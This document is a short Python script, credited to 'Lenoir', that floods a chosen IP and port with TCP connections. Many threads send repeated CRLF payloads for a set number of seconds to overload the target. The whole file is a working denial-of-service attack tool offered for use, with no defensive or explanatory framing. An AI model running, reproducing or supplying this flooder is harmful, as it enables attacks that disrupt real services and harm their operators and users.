#!/usr/bin/python
# -*- coding: utf-8 -*-
# TCP CPU Overload Script by Lenoir
from socket import create_connection, gethostbyname
from sys import argv
from threading import Thread
from time import sleep, time

print("TCP CPU Overload by Lenoir")

try: ip, port, threads, timed = gethostbyname(str(argv[1])), exit("The port number must be in the range of 1-65535") if (str(argv[2]).isdigit()==False or int(argv[2])<1 or int(argv[2])>65535) else int(argv[2]), exit(f"Usage: python {argv[0]} <IP> <port> <threads> <timed>") if (str(argv[3]).isdigit()==False or int(argv[3])<1) else int(argv[3]), exit(f"Usage: python {argv[0]} <IP> <port> <threads> <time>") if not str(argv[4]).isdigit() or int(argv[4])<1 else int(argv[4])
except Exception as err: exit("Invalid IP/domain" if "No address" in str(err) else "The target IP might be down, or the target port is filtered/closed." if "timed out" in str(err) else f"Usage: python {argv[0]} <IP> <port> <threads> <time>")

def run():
   for _ in range(500000*500000):
      try:
          sock = create_connection((ip, port), 5)
          for _ in range(500000*500000): sock.send(str('\r\n' * 1500).encode())
      except: continue

print(f"Flooding {ip}:{port} with {threads} threads for {timed} seconds...")
for _ in range(threads): Thread(target=run, daemon=True).start()
start = time()
while int(time() - start)<timed: sleep(1)
print("Done")

